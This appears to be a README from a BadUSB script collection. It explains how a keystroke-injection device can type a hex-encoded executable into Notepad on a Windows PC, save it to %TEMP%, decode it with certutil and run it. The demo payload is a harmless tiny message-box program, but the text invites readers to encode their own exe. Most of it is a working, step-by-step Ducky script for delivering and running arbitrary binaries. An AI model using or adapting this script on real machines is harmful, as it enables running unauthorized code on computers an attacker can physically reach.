## Load and Run an exe file via BadUSB

This idea is old, very very old, so old that I do not remember where I read about it. But which is this idea? Let's start with the problem: **How to transfer a binary file to a PC using only a keyboard?**

A binary file is made of different characters, but lot's of them are not available on a keyboard, so we must find a method to encode all characters to be "writable" on a keyboard. A way to accomplish this, which I used here, can be the HEX-encoding. If we can encode a binary file in HEX, copy it to the target machine, and then, tell the target machine to decode and run the exe we are done.

To accomplish this I used `certutil` to encode and decode the binary file, but any other tool can be used if available on the target machine. Keep in mind that on the target machine you **must have** a tool to decode the stream!

For my testing I used the `tiny.exe` *(available at this link: [Minimal (268 bytes) 64-bit (PE) that displays a message box on Windows 10](https://github.com/ayaka14732/TinyPE-on-Win10))* to keep the script as little as possible, it's your work to encode your exe and change the BadUSB script.

#### What this BadUSB script does?

1. Start `notepad.exe`

```
GUI r
DELAY 1000
STRING notepad.exe
ENTER
DELAY 2000
```

2. Dump into notepad the HEX-encoded `tiny.exe`

```
STRING 4d5a00000000000000000000000000000000000000000000000000000000
ENTER
STRING 000000000000000000000000000000000000000000000000000000000000
ENTER
[...]
DELAY 2000
```

3. Close and save the encoded `tiny.exe` file to `tiny.hex`

```
ALT F
DELAY 1000
STRING S
DELAY 1000
ALTSTRING "%TEMP%\tiny.hex"
DELAY 1000
ENTER
DELAY 1000
ALT F4
DELAY 2000
```

4. Use `certutil` to decode the `tiny.hex` to `tiny.exe`

```
GUI r
DELAY 500
ALTSTRING certutil -f -decodeHex "%TEMP%\tiny.hex" "%TEMP%\tiny.exe"
DELAY 1000
ENTER
DELAY 1000
```

5. Run the decoded `tiny.exe`

```
GUI r
DELAY 250
ALTSTRING "%TEMP%\tiny.exe"
ENTER
```

#### Some notes:

- to encode an binary file: `certutil -f -encodeHex [file.bin] [file.hex]`

- to decode the hex file: `certutil -f -decodeHex [file.hex] [file.bin]`

- when you encode a binary to hex, the result may be different from what you see into the example script, this is normal. To make the encoded data smaller I modified the hexdump by hand with a text editor.

- this script does not remove the temporary created files! if runned more than once remember to remove the temp file manually

- I was able to run this script on Windows 7 and Windows 10 but make your testing before running it

- I used some delays in the script, without them I got errors, so make your testing before removing ora adding more delay. *In particular after the dump I had to wait a little before continue, I think that the usb buffer needs some delay to send the full dump as it's a lot of data.*


